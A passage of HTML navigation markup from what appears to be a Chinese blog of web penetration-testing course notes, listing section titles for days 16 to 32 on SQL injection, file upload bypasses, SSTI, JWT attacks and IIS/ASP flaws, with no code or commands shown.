href="#2%E3%80%81%E7%8A%B6%E6%80%81%E5%9B%9E%E6%98%BE-%E7%99%BB%E5%BD%95-%E7%8A%B6%E6%80%81%E7%A0%81"><span class="nav-number">16.0.0.1.3.2.</span> <span class="nav-text">2、状态回显-登录-状态码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3%E3%80%81%E5%8F%82%E6%95%B0%E4%BF%AE%E6%94%B9-%E8%B4%AD%E7%89%A9%E4%B8%80%E5%8F%82%E6%95%B0%E4%BF%AE%E6%94%B9"><span class="nav-number">16.0.0.1.3.3.</span> <span class="nav-text">3、参数修改-购物一参数修改</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC17%E5%A4%A9-PHP%E5%BC%80%E5%8F%91-%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E9%A1%B9%E7%9B%AE-TP%E6%A1%86%E6%9E%B6-%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE-%E5%AE%89%E5%85%A8%E5%86%99%E6%B3%95-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">17.</span> <span class="nav-text">第17天 PHP开发-个人博客项目&amp;TP框架&amp;路由访问&amp;安全写法&amp;历史漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-3"><span class="nav-number">17.0.0.1.</span> <span class="nav-text">知识点：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC18%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-ASP%E5%AE%89%E5%85%A8-MDB%E4%B8%8B%E8%BD%BD%E6%A4%8D%E5%85%A5-IIS%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D-%E5%86%99%E6%9D%83%E9%99%90-%E8%A7%A3%E6%9E%90"><span class="nav-number">18.</span> <span class="nav-text">第18天：WEB攻防-ASP安全&amp;MDB下载植入&amp;IIS短文件名&amp;写权限&amp;解析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">18.0.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-1"><span class="nav-number">18.0.0.2.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#ASP-%E6%95%B0%E6%8D%AE%E5%BA%93-MDB%E9%BB%98%E8%AE%A4%E4%B8%8B%E8%BD%BD"><span class="nav-number">18.0.0.2.0.1.</span> <span class="nav-text">ASP-数据库-MDB默认下载</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ASP-%E6%95%B0%E6%8D%AE%E5%BA%93-ASP%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E8%BF%9E%E6%8E%A5"><span class="nav-number">18.0.0.2.0.2.</span> <span class="nav-text">ASP-数据库-ASP后门植入连接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ASP-%E4%B8%AD%E9%97%B4%E4%BB%B6-IIS%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%8E%A2%E9%92%88%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">18.0.0.2.0.3.</span> <span class="nav-text">ASP-中间件-IIS短文件名探针安全漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ASP-%E4%B8%AD%E9%97%B4%E4%BB%B6IIS%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90-%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">18.0.0.2.0.4.</span> <span class="nav-text">ASP-中间件IIS文件上传解析-安全漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#IS-put%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">18.0.0.2.0.5.</span> <span class="nav-text">IS put写入漏洞</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC19%E5%A4%A9WEB%E6%94%BB%E9%98%B2-NET%E9%A1%B9%E7%9B%AE8-DLL%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E6%8A%A5%E9%94%99"><span class="nav-number">19.</span> <span class="nav-text">第19天WEB攻防-.NET项目8&amp;DLL反编译&amp;未授权访问&amp;配置调试报错</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-4"><span class="nav-number">19.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-2"><span class="nav-number">19.0.0.2.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#NET%E9%A1%B9%E7%9B%AE-DLL%E6%96%87%E4%BB%B6%E5%8F%8D%E7%BC%96%E8%AF%91%E6%8C%87%E5%90%91-%E4%BB%A3%E7%A0%81%E7%89%B9%E6%80%A7"><span class="nav-number">19.0.0.2.0.1.</span> <span class="nav-text">.NET项目-DLL文件反编译指向-代码特性</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#NET%E9%A1%B9%E7%9B%AE-Web-config%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">19.0.0.2.0.2.</span> <span class="nav-text">.NET项目-Web.config错误调试-信息泄露</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#NET%E9%A1%B9%E7%9B%AE-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">19.0.0.2.0.3.</span> <span class="nav-text">.NET项目-身份验证未授权访问安全漏洞</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC20%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-PHP%E7%89%B9%E6%80%A7-%E7%BC%BA%E9%99%B7%E5%AF%B9%E6%AF%94%E5%87%BD%E6%95%B0-CTF%E8%80%83%E7%82%B9-CMS%E5%AE%A1%E8%AE%A1%E5%AE%9E%E4%BE%8B"><span class="nav-number">20.</span> <span class="nav-text">第20天 WEB攻防-PHP特性&amp;缺陷对比函数&amp;CTF考点&amp;CMS审计实例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-5"><span class="nav-number">20.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B1%EF%BC%9A"><span class="nav-number">20.0.0.2.</span> <span class="nav-text">演示案例1：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B2%EF%BC%9A"><span class="nav-number">20.0.0.3.</span> <span class="nav-text">演示案例2：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%9E%E8%B7%B5-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E8%BF%87%E6%BB%A4%E7%BC%BA%E9%99%B7%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">20.0.0.3.0.1.</span> <span class="nav-text">实践-代码审计-过滤缺陷文件读取</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BC%80%E6%BA%90%E7%9B%B8%E5%86%8Cpiwigo-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">20.0.0.3.0.2.</span> <span class="nav-text">开源相册piwigo sql注入漏洞</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC21%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-JavaWeb%E9%A1%B9%E7%9B%AE-JWT%E8%BA%AB%E4%BB%BD%E6%94%BB%E5%87%BB-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="nav-number">21.</span> <span class="nav-text">第21天 WEB攻防-JavaWeb项目&amp;JWT身份攻击&amp;组件安全&amp;访问控制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-6"><span class="nav-number">21.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-3"><span class="nav-number">21.0.0.2.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#JavaWeb-WebGoat8%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8"><span class="nav-number">21.0.0.2.0.1.</span> <span class="nav-text">JavaWeb-WebGoat8靶场搭建使用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-JWT%E6%94%BB%E5%87%BB"><span class="nav-number">21.0.0.2.0.2.</span> <span class="nav-text">安全问题-目录遍历&amp;身份认证-JWT攻击</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E5%AE%89%E5%85%A8%E7%BB%84%E4%BB%B6%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6"><span class="nav-number">21.0.0.2.0.3.</span> <span class="nav-text">安全问题-访问控制&amp;安全组件第三方组件</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC22%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-JS%E9%A1%B9%E7%9B%AE-Node-JSi%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A88%E8%AF%86%E5%88%AB%E5%AE%A1%E8%AE%A1-%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="nav-number">22.</span> <span class="nav-text">第22天 WEB攻防-JS项目&amp;Node.JSi框架安全8识别审计&amp;验证绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-7"><span class="nav-number">22.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A"><span class="nav-number">22.0.0.2.</span> <span class="nav-text">#详细点：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFJs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9F"><span class="nav-number">22.0.0.2.0.1.</span> <span class="nav-text">1、什么是Js渗透测试？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3%E3%80%81%E5%A6%82%E4%BD%95%E5%88%A4%E5%AE%9AJS%E5%BC%80%E5%8F%91%E5%BA%94%E7%94%A8%EF%BC%9F"><span class="nav-number">22.0.0.2.0.2.</span> <span class="nav-text">3、如何判定JS开发应用？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4%E3%80%81%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E6%9B%B4%E5%A4%9A%E7%9A%84JS%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="nav-number">22.0.0.2.0.3.</span> <span class="nav-text">4、如何获取更多的JS文件？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5%E3%80%81%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E8%8E%B7%E5%8F%96%E4%BB%B7%E5%80%BC%E4%BB%A3%E7%A0%81%EF%BC%9F"><span class="nav-number">22.0.0.2.0.4.</span> <span class="nav-text">5、如何快速获取价值代码？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-4"><span class="nav-number">22.0.0.3.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%9D%A1%E4%BB%B6%E5%8F%AF%E6%8E%A7%E5%8F%98%E9%87%8F-%E7%89%B9%E5%AE%9A%E5%87%BD%E6%95%B0"><span class="nav-number">22.0.0.3.0.1.</span> <span class="nav-text">安全条件可控变量&amp;特定函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6-Vulhub-Node-JS%E5%AE%89%E5%85%A8"><span class="nav-number">22.0.0.3.0.2.</span> <span class="nav-text">开发框架-Vulhub-Node.JS安全</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%9C%9F%E5%AE%9E%E5%BA%94%E7%94%A8-APP%E5%BA%94%E7%94%A8%E7%9B%B4%E6%8E%A5%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="nav-number">22.0.0.3.0.3.</span> <span class="nav-text">真实应用-APP应用直接重置密码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%9C%9F%E5%AE%9E%E5%BA%94%E7%94%A8-%E8%BF%9D%E6%B3%95%E5%BD%A9%E5%BD%A9%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%89%E5%85%A8"><span class="nav-number">22.0.0.3.0.4.</span> <span class="nav-text">真实应用-违法彩彩文件上传安全</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC23%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-Python%E8%80%83%E7%82%B9-CTF%E4%B8%8ECMS-SSTI%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-PYC%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="nav-number">23.</span> <span class="nav-text">第23天 WEB攻防-Python考点&amp;CTF与CMS-SSTI模版注入&amp;PYC反编译</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-8"><span class="nav-number">23.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-5"><span class="nav-number">23.0.0.2.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Pyc%E6%96%87%E4%BB%B6%E6%98%AFpy%E6%96%87%E4%BB%B6%E7%BC%96%E8%AF%91%E5%90%8E%E7%94%9F%E6%88%90%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6-byte-code-Pyc%E6%96%87%E4%BB%B6%E7%BB%8F%E8%BF%87pythonf%E8%A7%A3%E9%87%8A%E5%99%A8"><span class="nav-number">23.0.0.2.0.1.</span> <span class="nav-text">#Pyc文件是py文件编译后生成的字节码文件(byte code),Pyc文件经过pythonf解释器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#SSTI%E5%85%A5%E9%97%A8-%E5%8E%9F%E7%90%86-%E5%88%86%E7%B1%BB-%E6%A3%80%E6%B5%8B-%E5%88%86%E6%9E%90-%E5%88%A9%E7%94%A8"><span class="nav-number">23.0.0.2.0.2.</span> <span class="nav-text">#SSTI入门-原理&amp;分类&amp;检测&amp;分析&amp;利用</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC24%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5-MYSQL%E8%B7%A8%E5%BA%93-ACCESS%E5%81%8F%E7%A7%BB"><span class="nav-number">24.</span> <span class="nav-text">第24天 WEB攻防-通用漏洞&amp;SQL注入&amp;MYSQL跨库&amp;ACCESS偏移</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-9"><span class="nav-number">24.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="nav-number">24.0.0.2.</span> <span class="nav-text">#前置知识：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC25%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-SQL%E8%AF%BB%E5%86%99%E6%B3%A8%E5%85%A5-MYSQL-MSSQL-PostgreSQL"><span class="nav-number">25.</span> <span class="nav-text">第25天 WEB攻防-通用漏洞&amp;SQL读写注入&amp;MYSQL&amp;MSSQL&amp;PostgreSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-10"><span class="nav-number">25.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-6"><span class="nav-number">25.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-1"><span class="nav-number">25.0.0.3.</span> <span class="nav-text">#详细点：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC27%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5-Tamper%E8%84%9A%E6%9C%AC-Base64-Json-md5%E7%AD%89"><span class="nav-number">26.</span> <span class="nav-text">第27天 WEB攻防-通用漏洞&amp;SQL注入&amp;Tamper脚本&amp;Base64&amp;Json&amp;md5等</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-11"><span class="nav-number">26.0.0.1.</span> <span class="nav-text">知识点：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A"><span class="nav-number">26.0.0.1.1.</span> <span class="nav-text">#参考资料：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-7"><span class="nav-number">26.0.0.2.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%BA%90%E7%A0%81%E6%95%B0%E5%AD%97-%E5%AD%97%E7%AC%A6-%E6%90%9C%E7%B4%A2-%E7%BC%96%E7%A0%81-JSON"><span class="nav-number">26.0.0.2.0.1.</span> <span class="nav-text">本地源码数字&amp;字符&amp;搜索&amp;编码&amp;JSON</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%A2%A8%E8%80%85%E9%9D%B6%E5%9C%BA%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89%E5%A4%84%E7%90%86%E9%98%B2%E6%8A%A4-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">26.0.0.2.0.2.</span> <span class="nav-text">墨者靶场字符转义处理防护-宽字节注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%9C%9F%E5%AE%9EWEB-%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E6%8E%A5%E5%8F%97%E5%A4%84%E7%90%86-base64%E6%B3%A8%E5%85%A5"><span class="nav-number">26.0.0.2.0.3.</span> <span class="nav-text">真实WEB-数据编码接受处理-base64注入</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC28%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4XFF-COOKIE-POST%E6%B8%85%E6%B1%82"><span class="nav-number">27.</span> <span class="nav-text">第28天 WEB攻防-通用漏洞&amp;SQL注入&amp;HTTP头XFF&amp;COOKIE&amp;POST清求</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC29%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5-%E7%9B%B2%E6%B3%A8-%E5%BB%B6%E6%97%B6-%E5%B8%83%E5%B0%94-%E6%8A%A5%E9%94%99"><span class="nav-number">28.</span> <span class="nav-text">第29天 WEB攻防-通用漏洞&amp;SQL注入&amp;增删改查&amp;盲注&amp;延时&amp;布尔&amp;报错</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-12"><span class="nav-number">28.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-2"><span class="nav-number">28.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-8"><span class="nav-number">28.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC30%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5-CTF-%E4%BA%8C%E6%AC%A1-%E5%A0%86%E5%8F%A0-DNS%E5%B8%A6%E5%A4%96"><span class="nav-number">29.</span> <span class="nav-text">第30天 WEB攻防-通用漏洞&amp;SQL注入&amp;CTF&amp;二次&amp;堆叠&amp;DNS带外</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-13"><span class="nav-number">29.0.0.1.</span> <span class="nav-text">知识点：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">29.0.0.1.0.1.</span> <span class="nav-text">1、数据库堆叠注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">29.0.0.1.0.2.</span> <span class="nav-text">2、数据库二次注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93Dnslog%E6%B3%A8%E5%85%A5"><span class="nav-number">29.0.0.1.0.3.</span> <span class="nav-text">3、数据库Dnslog注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4%E3%80%81%E9%BB%91%E7%9B%92%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90%E4%BB%A5%E4%B8%8A"><span class="nav-number">29.0.0.1.0.4.</span> <span class="nav-text">4、黑盒模式分析以上</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-9"><span class="nav-number">29.0.0.2.</span> <span class="nav-text">演示案例：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-74CMS-%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish"><span class="nav-number">29.0.0.2.0.1.</span> <span class="nav-text">#二次注入-74CMS&amp;网鼎杯2018 Unfinish</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B-%E5%BC%BA%E7%BD%91%E6%9D%AF2019%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">29.0.0.2.0.2.</span> <span class="nav-text">#堆叠注入数据库类型&amp;强网杯2019随便注</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#DNS%E5%88%A9%E7%94%A8-%E5%B9%B3%E5%8F%B0%E4%BB%8B%E7%BB%8D-SQL%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89"><span class="nav-number">29.0.0.2.0.3.</span> <span class="nav-text">#DNS利用-平台介绍&amp;SQL注入&amp;命令执行等</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC31%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-js%E9%AA%8C%E8%AF%81-mime-user-ini-%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7"><span class="nav-number">30.</span> <span class="nav-text">第31天 WEB攻防-通用漏洞&amp;文件上传&amp;js验证&amp;mime&amp;user.ini&amp;语言特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-14"><span class="nav-number">30.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-3"><span class="nav-number">30.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E7%AB%A0%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="nav-number">30.0.0.3.</span> <span class="nav-text">#本章课程内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-10"><span class="nav-number">30.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC32%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E4%BA%8C%E6%AC%A1%E6%B4%B9%E6%9F%938-htaccess-%E5%8F%98%E5%BC%82%E5%85%8D%E6%9D%80"><span class="nav-number">31.</span> <span class="nav-text">第32天 WEB攻防-通用漏洞&amp;文件上传&amp;二次洹染8&amp;htaccess&amp;变异免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-15"><span class="nav-number">31.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-4"><span class="nav-number">31.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E7%AB%A0%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9%EF%BC%9A-1"><span class="nav-number">31.0.0.3.</span> <span class="nav-text">#本章课程内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%EF%BC%9A"><span class="nav-number">31.0.0.4.</span> <span class="nav-text">#前置：</span></a></li><li 